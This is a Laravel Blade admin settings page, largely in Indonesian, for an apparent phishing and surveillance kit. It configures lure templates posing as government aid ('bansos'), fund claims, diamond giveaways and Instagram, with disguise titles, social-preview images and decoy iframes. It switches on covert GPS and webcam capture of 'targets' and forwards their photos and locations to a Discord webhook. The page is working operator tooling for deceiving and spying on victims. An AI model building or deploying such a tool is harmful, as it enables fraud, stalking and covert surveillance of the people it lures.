@extends('layouts.admin')

@section('title', 'Discord & Settings')

@section('content')
<div class="space-y-6 max-w-5xl mx-auto">

    <!-- Header -->
    <div class="p-4 sm:p-5 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo">
        <div class="flex items-center gap-2">
            <span class="px-2 py-0.5 rounded-md bg-pastel-orange border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                SYSTEM CONFIG
            </span>
            <h1 class="text-xl sm:text-2xl font-black text-black tracking-tight">Configuration & Templates</h1>
        </div>
        <p class="text-zinc-600 text-xs sm:text-sm mt-1 font-medium">Manage landing templates, Discord Webhook integrations, disguise parameters, and telemetry triggers.</p>
    </div>

    <!-- Discord Integration Card -->
    <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b-2 border-black/10 pb-4">
            <div class="flex items-center space-x-3">
                <div class="w-12 h-12 rounded-2xl bg-[#5865F2] border-2 border-black shadow-neo flex items-center justify-center text-white text-2xl shrink-0">
                    <i class="fa-brands fa-discord"></i>
                </div>
                <div>
                    <h3 class="font-black text-black text-base">Discord Webhook Integration</h3>
                    <p class="text-xs text-zinc-600 font-medium">Telemetry logs & target photos will be forwarded directly to your Discord channel in real-time.</p>
                </div>
            </div>

            <button type="button" onclick="testWebhook()" id="testWebhookBtn"
                    class="w-full sm:w-auto px-5 py-2.5 bg-pastel-purple hover:bg-purple-300 text-black text-xs font-black uppercase tracking-wider rounded-xl border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center justify-center gap-1.5 shrink-0">
                <i class="fa-solid fa-paper-plane"></i>
                <span>Test Webhook</span>
            </button>
        </div>

        <div id="webhookTestResult" class="hidden p-3.5 rounded-xl text-xs font-bold font-mono border-2 border-black shadow-neo-sm flex items-center gap-2"></div>
    </div>

    <!-- Master Settings Form -->
    <form action="{{ route('admin.settings.update') }}" method="POST" class="space-y-6">
        @csrf

        <!-- Template Selector Section -->
        <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-1 border-b-2 border-black/10 pb-3">
                <div>
                    <h4 class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-lime border border-black px-2 py-0.5 rounded-md inline-block shadow-neo-sm">
                        ACTIVE ROOT TEMPLATE
                    </h4>
                    <p class="text-xs text-zinc-600 mt-1 font-medium">Pilih template utama yang akan ditampilkan saat pengunjung membuka alamat root (<code>/</code>).</p>
                </div>
                <span class="text-[11px] text-zinc-500 font-mono font-bold">Semua template tetap aktif via <code>/p/{slug}</code></span>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5 pt-1">
                @php
                    $pastelColors = [
                        'gampil' => 'bg-pastel-yellow',
                        'bansos' => 'bg-pastel-purple',
                        'klaim-dana' => 'bg-pastel-orange',
                        'diamond' => 'bg-pastel-lime',
                        'penarikandana' => 'bg-pastel-green',
                        'chatme' => 'bg-pastel-pink',
                        'instagram' => 'bg-[#ffd5ea]',
                    ];
                @endphp
                @foreach($templates as $id => $tpl)
                    <label class="relative block cursor-pointer group">
                        <input type="radio" name="active_template" value="{{ $id }}" {{ $settings['active_template'] === $id ? 'checked' : '' }} class="sr-only peer">
                        <div class="p-4 rounded-2xl border-2 border-black bg-white transition duration-200 peer-checked:{{ $pastelColors[$id] ?? 'bg-pastel-lime' }} peer-checked:shadow-neo shadow-neo-sm hover:shadow-neo h-full flex flex-col justify-between">
                            <div>
                                <div class="flex items-center justify-between mb-2.5">
                                    <div class="w-9 h-9 rounded-xl bg-black text-white flex items-center justify-center text-sm shadow-neo-sm">
                                        <i class="fa-solid {{ $tpl['icon'] }}"></i>
                                    </div>
                                    <span class="px-2.5 py-0.5 text-[10px] font-extrabold rounded-lg border border-black bg-white text-black shadow-neo-sm">
                                        {{ $tpl['badge'] }}
                                    </span>
                                </div>
                                <h5 class="font-black text-black text-sm group-hover:text-purple-700 transition">{{ $tpl['name'] }}</h5>
                                <p class="text-xs text-zinc-600 mt-1 leading-relaxed font-medium">{{ $tpl['description'] }}</p>
                            </div>

                            <div class="pt-3 border-t border-black/15 mt-3 flex items-center justify-between text-xs">
                                <span class="text-black font-mono font-bold text-[10px] bg-white/70 px-1.5 py-0.5 rounded border border-black/40">/p/{{ $id }}</span>
                                <a href="{{ route('landing.custom', $id) }}" target="_blank" onclick="event.stopPropagation();" class="text-black hover:text-purple-700 font-extrabold text-xs flex items-center gap-1">
                                    Preview <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i>
                                </a>
                            </div>
                        </div>
                    </label>
                @endforeach
            </div>
        </div>

        <!-- Discord Settings Section -->
        <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-purple border border-black px-2 py-0.5 rounded-md inline-block shadow-neo-sm">
                DISCORD WEBHOOK CREDENTIALS
            </h4>

            <div>
                <label for="discord_webhook_url" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Discord Webhook URL</label>
                <input type="url" id="discord_webhook_url" name="discord_webhook_url" 
                       value="{{ old('discord_webhook_url', $settings['discord_webhook_url']) }}"
                       placeholder="https://discord.com/api/webhooks/1234567890/abcdefg..."
                       class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-mono font-bold placeholder-zinc-400 focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                <p class="text-xs text-zinc-500 font-medium mt-1">Tersimpan aman di sisi server database. Tidak pernah diekspos ke browser pengunjung.</p>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-1">
                <div>
                    <label for="bot_name" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Bot Display Name</label>
                    <input type="text" id="bot_name" name="bot_name" 
                           value="{{ old('bot_name', $settings['bot_name']) }}"
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>
                <div>
                    <label for="bot_avatar_url" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Bot Avatar URL</label>
                    <input type="url" id="bot_avatar_url" name="bot_avatar_url" 
                           value="{{ old('bot_avatar_url', $settings['bot_avatar_url']) }}"
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>
            </div>
        </div>

        <!-- Disguise & Decoy Parameters -->
        <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-orange border border-black px-2 py-0.5 rounded-md inline-block shadow-neo-sm">
                PENGATURAN KONTEN & SOCIAL PREVIEW (CUSTOM TEMPLATE)
            </h4>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                    <label for="site_title" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Page Title / Social OpenGraph Title</label>
                    <input type="text" id="site_title" name="site_title" 
                           value="{{ old('site_title', $settings['site_title']) }}" required
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>

                <div>
                    <label for="landing_heading" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Hero Headline / Judul Utama</label>
                    <input type="text" id="landing_heading" name="landing_heading" 
                           value="{{ old('landing_heading', $settings['landing_heading']) }}"
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>
            </div>

            <div>
                <label for="site_description" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Social Preview Description / Ringkasan Singkat</label>
                <input type="text" id="site_description" name="site_description" 
                       value="{{ old('site_description', $settings['site_description']) }}"
                       class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
            </div>

            <div>
                <label for="landing_article_body" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Isi Artikel / Ringkasan & Fakta Informasi</label>
                <textarea id="landing_article_body" name="landing_article_body" rows="4"
                          placeholder="Tuliskan isi artikel atau informasi yang akan ditampilkan di halaman /p/gampil..."
                          class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-medium focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm leading-relaxed">{{ old('landing_article_body', $settings['landing_article_body']) }}</textarea>
                <p class="text-xs text-zinc-500 font-medium mt-0.5">Teks ini akan menggantikan paragraf ringkasan informasi di template utama /p/gampil.</p>
            </div>

            <div>
                <label for="og_image_url" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Social Preview Image & Banner (URL atau Path Lokal)</label>
                <input type="text" id="og_image_url" name="og_image_url" 
                       value="{{ old('og_image_url', $settings['og_image_url']) }}"
                       placeholder="images/landing/bansos-banner.jpg atau https://..."
                       class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-mono font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                <p class="text-xs text-zinc-500 font-medium mt-1">Aset lokal tersedia: <code>images/landing/bansos-jadwal.jpg</code>, <code>images/landing/bg.jpg</code>, <code>images/landing/dana-logo.jpg</code>, <code>images/landing/template-saldo.jpg</code></p>
            </div>

            <div>
                <label for="decoy_iframe_url" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Decoy Iframe Website URL <span class="text-zinc-500 font-normal font-sans">(Opsional - Bisa Dikosongkan)</span></label>
                <input type="url" id="decoy_iframe_url" name="decoy_iframe_url" 
                       value="{{ old('decoy_iframe_url', $settings['decoy_iframe_url']) }}"
                       placeholder="https://... (Biarkan kosong jika ingin portal artikel bersih tanpa frame)"
                       class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                <p class="text-xs text-zinc-500 font-medium mt-1">Jika dikosongkan, halaman akan tampil bersih sebagai portal berita/artikel mandiri tanpa frame website.</p>
            </div>
        </div>

        <!-- Telemetry & Capture Engine -->
        <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-lime border border-black px-2 py-0.5 rounded-md inline-block shadow-neo-sm">
                TELEMETRY & SENSOR RULES
            </h4>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div class="p-4 bg-white rounded-xl border-2 border-black shadow-neo-sm flex items-center justify-between gap-2">
                    <div>
                        <div class="text-xs font-black text-black">Capture GPS Location</div>
                        <div class="text-[11px] text-zinc-500 font-medium">High precision browser satellite coordinates</div>
                    </div>
                    <select name="capture_gps_enabled" class="px-3 py-1.5 bg-cream-200 border-2 border-black rounded-lg text-xs font-bold text-black shadow-neo-sm cursor-pointer">
                        <option value="1" {{ $settings['capture_gps_enabled'] == '1' ? 'selected' : '' }}>Enabled</option>
                        <option value="0" {{ $settings['capture_gps_enabled'] == '0' ? 'selected' : '' }}>Disabled</option>
                    </select>
                </div>

                <div class="p-4 bg-white rounded-xl border-2 border-black shadow-neo-sm flex items-center justify-between gap-2">
                    <div>
                        <div class="text-xs font-black text-black">Capture Webcam Stream</div>
                        <div class="text-[11px] text-zinc-500 font-medium">Camera snapshot telemetry</div>
                    </div>
                    <select name="capture_cam_enabled" class="px-3 py-1.5 bg-cream-200 border-2 border-black rounded-lg text-xs font-bold text-black shadow-neo-sm cursor-pointer">
                        <option value="1" {{ $settings['capture_cam_enabled'] == '1' ? 'selected' : '' }}>Enabled</option>
                        <option value="0" {{ $settings['capture_cam_enabled'] == '0' ? 'selected' : '' }}>Disabled</option>
                    </select>
                </div>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-1">
                <div>
                    <label for="cam_interval_ms" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Camera Interval (Milliseconds)</label>
                    <input type="number" id="cam_interval_ms" name="cam_interval_ms" min="1000" max="60000" step="500"
                           value="{{ old('cam_interval_ms', $settings['cam_interval_ms']) }}"
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>

                <div>
                    <label for="max_snapshots_per_session" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Max Snapshots Per Target</label>
                    <input type="number" id="max_snapshots_per_session" name="max_snapshots_per_session" min="1" max="50"
                           value="{{ old('max_snapshots_per_session', $settings['max_snapshots_per_session']) }}"
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>
            </div>
        </div>

        <div class="flex justify-end">
            <button type="submit" class="w-full sm:w-auto px-7 py-3.5 bg-pastel-lime hover:bg-pastel-limeDark text-black font-black text-xs sm:text-sm uppercase tracking-wider rounded-xl border-2 border-black shadow-neo hover:shadow-neo-lg active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center justify-center gap-2">
                <i class="fa-solid fa-floppy-disk text-base"></i>
                <span>Save All Settings & Template</span>
            </button>
        </div>

    </form>

    <!-- Security & Password Change Card -->
    <div class="p-5 sm:p-6 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo-lg space-y-4">
        <div class="border-b-2 border-black/10 pb-3">
            <h4 class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-pink border border-black px-2 py-0.5 rounded-md inline-block shadow-neo-sm">
                OPERATOR SECURITY
            </h4>
            <p class="text-xs text-zinc-600 mt-1 font-medium">Ganti password akun operator admin Anda kapan saja.</p>
        </div>

        <form action="{{ route('admin.settings.password') }}" method="POST" class="space-y-4">
            @csrf
            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div>
                    <label for="current_password" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Current Password</label>
                    <input type="password" id="current_password" name="current_password" required
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>

                <div>
                    <label for="new_password" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">New Password</label>
                    <input type="password" id="new_password" name="new_password" minlength="8" required
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>

                <div>
                    <label for="new_password_confirmation" class="block text-xs font-black text-black mb-1.5 uppercase tracking-wider">Confirm New Password</label>
                    <input type="password" id="new_password_confirmation" name="new_password_confirmation" minlength="8" required
                           class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm text-black font-bold focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
                </div>
            </div>

            <div class="flex justify-end pt-1">
                <button type="submit" class="w-full sm:w-auto px-5 py-2.5 bg-pastel-purple hover:bg-purple-300 text-black font-black text-xs uppercase tracking-wider rounded-xl border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center justify-center gap-1.5">
                    <i class="fa-solid fa-key"></i>
                    <span>Update Password</span>
                </button>
            </div>
        </form>
    </div>

</div>

<script>
function testWebhook() {
    const btn = document.getElementById('testWebhookBtn');
    const resultDiv = document.getElementById('webhookTestResult');
    const url = document.getElementById('discord_webhook_url').value;

    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1"></i> Testing...';
    resultDiv.classList.add('hidden');

    fetch("{{ route('admin.settings.test_webhook') }}", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': '{{ csrf_token() }}'
        },
        body: JSON.stringify({ url: url })
    })
    .then(async response => {
        const data = await response.json();
        resultDiv.classList.remove('hidden');
        if (response.ok && data.success) {
            resultDiv.className = 'p-3.5 rounded-xl text-xs font-bold font-mono border-2 border-black shadow-neo-sm flex items-center gap-2 bg-pastel-green text-black';
            resultDiv.innerHTML = '<i class="fa-solid fa-circle-check text-base"></i><span>' + data.message + '</span>';
        } else {
            resultDiv.className = 'p-3.5 rounded-xl text-xs font-bold font-mono border-2 border-black shadow-neo-sm flex items-center gap-2 bg-pastel-pink text-black';
            resultDiv.innerHTML = '<i class="fa-solid fa-circle-xmark text-base"></i><span>' + (data.message || 'Webhook verification failed.') + '</span>';
        }
    })
    .catch(err => {
        resultDiv.classList.remove('hidden');
        resultDiv.className = 'p-3.5 rounded-xl text-xs font-bold font-mono border-2 border-black shadow-neo-sm flex items-center gap-2 bg-pastel-pink text-black';
        resultDiv.innerHTML = '<i class="fa-solid fa-circle-xmark text-base"></i><span>Network or server error during webhook test.</span>';
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-paper-plane mr-1"></i> Test Webhook';
    });
}
</script>
@endsection
